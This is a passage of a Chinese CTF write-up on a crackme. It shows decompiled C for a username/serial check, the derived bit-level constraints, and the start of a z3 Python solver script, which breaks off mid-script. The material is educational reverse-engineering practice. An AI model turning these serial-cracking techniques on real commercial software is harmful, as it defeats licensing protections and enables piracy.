class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __stdcall sub_401740(<span class="built_in">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v1; // edi</span><br><span class="line">  <span class="built_in">int</span> v3; // esi</span><br><span class="line">  <span class="built_in">int</span> v4; // esi</span><br><span class="line">  __int16 v5; // bx</span><br><span class="line">  char v6; // al</span><br><span class="line">  char v7; // al</span><br><span class="line">  unsigned __int8 v8; // bl</span><br><span class="line">  wchar_t *Buffer; // eax</span><br><span class="line">  __int16 v10; // di</span><br><span class="line">  wchar_t *v11; // eax</span><br><span class="line">  __int16 v12; // di</span><br><span class="line">  wchar_t *v13; // eax</span><br><span class="line">  __int16 v14; // di</span><br><span class="line">  wchar_t *v15; // eax</span><br><span class="line">  __int16 v16; // di</span><br><span class="line">  wchar_t *v17; // eax</span><br><span class="line">  __int16 v18; // di</span><br><span class="line">  char v19; // al</span><br><span class="line">  char v20; // al</span><br><span class="line">  unsigned __int8 v21; // bl</span><br><span class="line">  wchar_t *v22; // eax</span><br><span class="line">  __int16 v23; // di</span><br><span class="line">  wchar_t *v24; // eax</span><br><span class="line">  __int16 v25; // di</span><br><span class="line">  wchar_t *v26; // eax</span><br><span class="line">  __int16 v27; // di</span><br><span class="line">  wchar_t *v28; // eax</span><br><span class="line">  __int16 v29; // di</span><br><span class="line">  wchar_t *v30; // eax</span><br><span class="line">  __int16 v31; // si</span><br><span class="line">  unsigned __int8 v32; // [esp+10h] [ebp-28h]</span><br><span class="line">  unsigned __int8 v33; // [esp+10h] [ebp-28h]</span><br><span class="line">  unsigned __int8 v34; // [esp+11h] [ebp-27h]</span><br><span class="line">  unsigned __int8 v35; // [esp+11h] [ebp-27h]</span><br><span class="line">  unsigned __int8 v36; // [esp+13h] [ebp-25h]</span><br><span class="line">  unsigned __int8 v37; // [esp+13h] [ebp-25h]</span><br><span class="line">  unsigned __int8 v38; // [esp+14h] [ebp-24h]</span><br><span class="line">  unsigned __int8 v39; // [esp+14h] [ebp-24h]</span><br><span class="line">  unsigned __int8 v40; // [esp+18h] [ebp-20h]</span><br><span class="line">  unsigned __int8 v41; // [esp+18h] [ebp-20h]</span><br><span class="line">  unsigned __int8 v42; // [esp+19h] [ebp-1Fh]</span><br><span class="line">  unsigned __int8 v43; // [esp+19h] [ebp-1Fh]</span><br><span class="line">  unsigned __int8 v44; // [esp+1Ah] [ebp-1Eh]</span><br><span class="line">  unsigned __int8 v45; // [esp+1Ah] [ebp-1Eh]</span><br><span class="line">  unsigned __int8 v46; // [esp+1Bh] [ebp-1Dh]</span><br><span class="line">  unsigned __int8 v47; // [esp+1Bh] [ebp-1Dh]</span><br><span class="line">  unsigned __int8 v48; // [esp+1Ch] [ebp-1Ch]</span><br><span class="line">  unsigned __int8 v49; // [esp+1Ch] [ebp-1Ch]</span><br><span class="line">  <span class="built_in">int</span> v50; // [esp+20h] [ebp-18h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v51; // [esp+24h] [ebp-14h] BYREF</span><br><span class="line">  char v52[<span class="number">4</span>]; // [esp+28h] [ebp-10h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v53; // [esp+34h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(&amp;v50);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v53 = <span class="number">0</span>;</span><br><span class="line">  ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(&amp;v51);</span><br><span class="line">  ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(v52);</span><br><span class="line">  LOBYTE(v53) = <span class="number">2</span>;</span><br><span class="line">  CWnd::GetWindowTextW(a1 + <span class="number">304</span>, &amp;v50);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(v50 - <span class="number">12</span>) == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v50, v3) &gt;= 0x61u</span><br><span class="line">         &amp;&amp; (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v50, v3) &lt;= 0x7Au )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ++v3 &gt;= <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v1 != v4 )</span><br><span class="line">          &#123;</span><br><span class="line">            v5 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v50, v4);</span><br><span class="line">            <span class="keyword">if</span> ( (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v50, v1) == v5 )</span><br><span class="line">              goto LABEL_2;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( ++v4 &gt;= <span class="number">4</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ++v1 &lt; <span class="number">4</span> )</span><br><span class="line">              goto LABEL_7;</span><br><span class="line">            CWnd::GetWindowTextW(a1 + <span class="number">420</span>, &amp;v51);</span><br><span class="line">            <span class="keyword">if</span> ( *(_DWORD *)(v51 - <span class="number">12</span>) == <span class="number">11</span> &amp;&amp; (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v51, <span class="number">5</span>) == <span class="number">45</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v6 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v50, <span class="number">0</span>);</span><br><span class="line">              v40 = (v6 &amp; <span class="number">1</span>) + <span class="number">5</span>;</span><br><span class="line">              v48 = ((v6 &amp; <span class="number">0x10</span>) != <span class="number">0</span>) + <span class="number">5</span>;</span><br><span class="line">              v42 = ((v6 &amp; <span class="number">2</span>) != <span class="number">0</span>) + <span class="number">5</span>;</span><br><span class="line">              v44 = ((v6 &amp; <span class="number">4</span>) != <span class="number">0</span>) + <span class="number">5</span>;</span><br><span class="line">              v46 = ((v6 &amp; <span class="number">8</span>) != <span class="number">0</span>) + <span class="number">5</span>;</span><br><span class="line">              v7 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v50, <span class="number">1</span>);</span><br><span class="line">              v32 = (v7 &amp; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">              v38 = ((v7 &amp; <span class="number">0x10</span>) != <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">              v34 = ((v7 &amp; <span class="number">2</span>) != <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">              v8 = ((v7 &amp; <span class="number">4</span>) != <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">              v36 = ((v7 &amp; <span class="number">8</span>) != <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">              Buffer = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetBuffer(v52);</span><br><span class="line">              itow_s(v40 + v8, Buffer, 0xAu, <span class="number">10</span>);</span><br><span class="line">              v10 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(v52, <span class="number">0</span>);</span><br><span class="line">              <span class="keyword">if</span> ( (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v51, <span class="number">0</span>) == v10 )</span><br><span class="line">              &#123;</span><br><span class="line">                ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::ReleaseBuffer(v52, -<span class="number">1</span>);</span><br><span class="line">                v11 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetBuffer(v52);</span><br><span class="line">                itow_s(v46 + v36, v11, 0xAu, <span class="number">10</span>);</span><br><span class="line">                v12 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v51, <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> ( v12 == (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(v52, <span class="number">0</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                  ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::ReleaseBuffer(v52, -<span class="number">1</span>);</span><br><span class="line">                  v13 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetBuffer(v52);</span><br><span class="line">                  itow_s(v42 + v38, v13, 0xAu, <span class="number">10</span>);</span><br><span class="line">                  v14 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v51, <span class="number">2</span>);</span><br><span class="line">                  <span class="keyword">if</span> ( v14 == (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(v52, <span class="number">0</span>) )</span><br><span class="line">                  &#123;</span><br><span class="line">                    ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::ReleaseBuffer(v52, -<span class="number">1</span>);</span><br><span class="line">                    v15 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetBuffer(v52);</span><br><span class="line">                    itow_s(v44 + v32, v15, 0xAu, <span class="number">10</span>);</span><br><span class="line">                    v16 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v51, <span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">if</span> ( v16 == (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(v52, <span class="number">0</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::ReleaseBuffer(v52, -<span class="number">1</span>);</span><br><span class="line">                      v17 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetBuffer(v52);</span><br><span class="line">                      itow_s(v48 + v34, v17, 0xAu, <span class="number">10</span>);</span><br><span class="line">                      v18 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v51, <span class="number">4</span>);</span><br><span class="line">                      <span class="keyword">if</span> ( v18 == (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(v52, <span class="number">0</span>) )</span><br><span class="line">                      &#123;</span><br><span class="line">                        ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::ReleaseBuffer(v52, -<span class="number">1</span>);</span><br><span class="line">                        v19 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v50, <span class="number">2</span>);</span><br><span class="line">                        v41 = (v19 &amp; <span class="number">1</span>) + <span class="number">5</span>;</span><br><span class="line">                        v49 = ((v19 &amp; <span class="number">0x10</span>) != <span class="number">0</span>) + <span class="number">5</span>;</span><br><span class="line">                        v43 = ((v19 &amp; <span class="number">2</span>) != <span class="number">0</span>) + <span class="number">5</span>;</span><br><span class="line">                        v45 = ((v19 &amp; <span class="number">4</span>) != <span class="number">0</span>) + <span class="number">5</span>;</span><br><span class="line">                        v47 = ((v19 &amp; <span class="number">8</span>) != <span class="number">0</span>) + <span class="number">5</span>;</span><br><span class="line">                        v20 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v50, <span class="number">3</span>);</span><br><span class="line">                        v33 = (v20 &amp; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">                        v39 = ((v20 &amp; <span class="number">0x10</span>) != <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">                        v35 = ((v20 &amp; <span class="number">2</span>) != <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">                        v21 = ((v20 &amp; <span class="number">4</span>) != <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">                        v37 = ((v20 &amp; <span class="number">8</span>) != <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">                        v22 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetBuffer(v52);</span><br><span class="line">                        itow_s(v41 + v21, v22, 0xAu, <span class="number">10</span>);</span><br><span class="line">                        v23 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v51, <span class="number">6</span>);</span><br><span class="line">                        <span class="keyword">if</span> ( v23 == (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(v52, <span class="number">0</span>) )</span><br><span class="line">                        &#123;</span><br><span class="line">                          ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::ReleaseBuffer(v52, -<span class="number">1</span>);</span><br><span class="line">                          v24 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetBuffer(v52);</span><br><span class="line">                          itow_s(v47 + v37, v24, 0xAu, <span class="number">10</span>);</span><br><span class="line">                          v25 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v51, <span class="number">7</span>);</span><br><span class="line">                          <span class="keyword">if</span> ( v25 == (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(v52, <span class="number">0</span>) )</span><br><span class="line">                          &#123;</span><br><span class="line">                            ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::ReleaseBuffer(v52, -<span class="number">1</span>);</span><br><span class="line">                            v26 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetBuffer(v52);</span><br><span class="line">                            itow_s(v43 + v39, v26, 0xAu, <span class="number">10</span>);</span><br><span class="line">                            v27 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v51, <span class="number">8</span>);</span><br><span class="line">                            <span class="keyword">if</span> ( v27 == (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(v52, <span class="number">0</span>) )</span><br><span class="line">                            &#123;</span><br><span class="line">                              ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::ReleaseBuffer(v52, -<span class="number">1</span>);</span><br><span class="line">                              v28 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetBuffer(v52);</span><br><span class="line">                              itow_s(v45 + v33, v28, 0xAu, <span class="number">10</span>);</span><br><span class="line">                              v29 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v51, <span class="number">9</span>);</span><br><span class="line">                              <span class="keyword">if</span> ( v29 == (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(v52, <span class="number">0</span>) )</span><br><span class="line">                              &#123;</span><br><span class="line">                                ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::ReleaseBuffer(v52, -<span class="number">1</span>);</span><br><span class="line">                                v30 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetBuffer(v52);</span><br><span class="line">                                itow_s(v49 + v35, v30, 0xAu, <span class="number">10</span>);</span><br><span class="line">                                v31 = ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(&amp;v51, <span class="number">10</span>);</span><br><span class="line">                                <span class="keyword">if</span> ( v31 == (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::GetAt(v52, <span class="number">0</span>) )</span><br><span class="line">                                &#123;</span><br><span class="line">                                  ATL::CSimpleStringT&lt;wchar_t,<span class="number">1</span>&gt;::ReleaseBuffer(v52, -<span class="number">1</span>);</span><br><span class="line">                                  ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::~CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(v52);</span><br><span class="line">                                  ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::~CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(&amp;v51);</span><br><span class="line">                                  ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::~CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(&amp;v50);</span><br><span class="line">                                  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                              &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            goto LABEL_2;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_2:</span><br><span class="line">  ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::~CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(v52);</span><br><span class="line">  ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::~CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(&amp;v51);</span><br><span class="line">  ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::~CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(&amp;v50);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="仔细阅读源码分析">仔细阅读源码分析</h2><h3 id="初始分析">初始分析</h3><p>username 只有4个字节。（从readme可知，也可以从代码里面看）</p><p>serial 只有11字节，且第serial[5]==‘-’。（从readme可知，也可以从代码里面看）</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530001527434.png" alt=""></p><h3 id="深入分析">深入分析</h3><p>这段代码量不是很多，只要细心，很快就能找出所有的限制条件。</p><p>1、username[0~3]值域为[‘a’,‘z’]</p><p>2、username[3] == ‘p’ //这个是题目给出的条件，非逆向所得。</p><p>3、0x0代码片段中有10个方程:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">((username[<span class="number">0</span>]&amp;<span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">1</span>]&gt;&gt;<span class="number">2</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>)-<span class="number">0x30</span></span><br><span class="line">((((username[<span class="number">0</span>]&gt;&gt;<span class="number">3</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>)+(((username[<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)&amp;<span class="number">1</span>)+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;6&#x27;</span>)-<span class="number">0x30</span></span><br><span class="line">(((username[<span class="number">0</span>]&gt;&gt;<span class="number">1</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">1</span>]&gt;&gt;<span class="number">4</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;8&#x27;</span>)-<span class="number">0x30</span></span><br><span class="line">(((username[<span class="number">0</span>]&gt;&gt;<span class="number">2</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">1</span>]) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>)-<span class="number">0x30</span></span><br><span class="line">(((username[<span class="number">0</span>]&gt;&gt;<span class="number">4</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">1</span>]&gt;&gt;<span class="number">1</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;6&#x27;</span>)-<span class="number">0x30</span></span><br><span class="line">(((username[<span class="number">2</span>]) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">3</span>]&gt;&gt;<span class="number">2</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>)-<span class="number">0x30</span></span><br><span class="line">(((username[<span class="number">2</span>]&gt;&gt;<span class="number">3</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">3</span>]&gt;&gt;<span class="number">3</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>)-<span class="number">0x30</span></span><br><span class="line">(((username[<span class="number">2</span>]&gt;&gt;<span class="number">1</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">3</span>]&gt;&gt;<span class="number">4</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>)-<span class="number">0x30</span></span><br><span class="line">(((username[<span class="number">2</span>]&gt;&gt;<span class="number">2</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">3</span>]) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>)-<span class="number">0x30</span></span><br><span class="line">(((username[<span class="number">2</span>]&gt;&gt;<span class="number">4</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">3</span>]&gt;&gt;<span class="number">1</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;6&#x27;</span>)-<span class="number">0x30</span></span><br></pre></td></tr></table></figure><p>ord是python中的函数，功能是将字符转成对应int。为什么我要这么做呢？从逆向出的代码片段可知，原程序用itow_s将运算值转为文本，然后取文本的最高位和输入的ASCII进行比较，但是运算结果只有一位数，我就直接用加减0x30，其次z3条件里面不能有str()这样的函数出现</p><h1>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">username = [BitVec(<span class="string">&#x27;u%d&#x27;</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>)]</span><br><span class="line">solver = Solver() <span class="comment">#76876-77776</span></span><br><span class="line">solver.add(((username[<span class="number">0</span>]&amp;<span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">1</span>]&gt;&gt;<span class="number">2</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>)-<span class="number">0x30</span>)</span><br><span class="line">solver.add(((((username[<span class="number">0</span>]&gt;&gt;<span class="number">3</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>)+(((username[<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)&amp;<span class="number">1</span>)+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;6&#x27;</span>)-<span class="number">0x30</span>)</span><br><span class="line">solver.add((((username[<span class="number">0</span>]&gt;&gt;<span class="number">1</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">1</span>]&gt;&gt;<span class="number">4</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;8&#x27;</span>)-<span class="number">0x30</span>)</span><br><span class="line">solver.add((((username[<span class="number">0</span>]&gt;&gt;<span class="number">2</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">1</span>]) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>)-<span class="number">0x30</span>)</span><br><span class="line">solver.add((((username[<span class="number">0</span>]&gt;&gt;<span class="number">4</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">1</span>]&gt;&gt;<span class="number">1</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;6&#x27;</span>)-<span class="number">0x30</span>)</span><br><span class="line">solver.add((((username[<span class="number">2</span>]) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">3</span>]&gt;&gt;<span class="number">2</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>)-<span class="number">0x30</span>)</span><br><span class="line">solver.add((((username[<span class="number">2</span>]&gt;&gt;<span class="number">3</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">3</span>]&gt;&gt;<span class="number">3</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>)-<span class="number">0x30</span>)</span><br><span class="line">solver.add((((username[<span class="number">2</span>]&gt;&gt;<span class="number">1</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">3</span>]&gt;&gt;<span class="number">4</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>)-<span class="number">0x30</span>)</span><br><span class="line">solver.add((((username[<span class="number">2</span>]&gt;&gt;<span class="number">2</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">3</span>]) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;7&#x27;</span>)-<span class="number">0x30</span>)</span><br><span class="line">solver.add((((username[<span class="number">2</span>]&gt;&gt;<span class="number">4</span>) &amp; <span class="number">1</span>)+<span class="number">5</span>+(((username[<span class="number">3</span>]&gt;&gt;<span class="number">1</span>) &amp; <span class="number">1</span> )+<span class="number">1</span>))==<span class="built_in">ord</span>(<span class="string">&#x27;6&#x27;</span>)-<span class="number">0x30</span>)</span><br><span 